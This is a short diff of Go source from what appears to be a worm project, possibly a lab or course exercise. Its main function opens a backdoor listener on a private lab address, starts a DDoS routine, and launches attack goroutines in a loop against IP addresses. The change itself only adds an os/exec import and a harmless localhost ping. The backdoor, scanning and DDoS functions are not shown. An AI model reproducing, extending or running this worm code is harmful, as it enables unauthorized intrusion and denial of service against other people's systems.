@@ -7,7 +7,7 @@ import (
 	"github.com/99graciamanel/mlw/worm/scan"
 	"github.com/99graciamanel/mlw/worm/ddos"
 	"strconv"
-	//"os"
+	"os/exec"
 )
 
 func attack(wg *sync.WaitGroup, id int, ip string) {
@@ -58,7 +58,6 @@ func attack(wg *sync.WaitGroup, id int, ip string) {
 
 func main() {
 	go infection.OpenBackdoor("10.0.2.15:8000")
-
 	var wg sync.WaitGroup
 	wg.Add(1)
 	go ddos.Hello(&wg,"test")
@@ -80,6 +79,7 @@ func main() {
 		fmt.Println(i)
 		wg.Add(1)
 		go attack(&wg, i, ip)
+		exec.Command("ping","127.0.0.1").Output()
 	}
 	wg.Wait()
 }
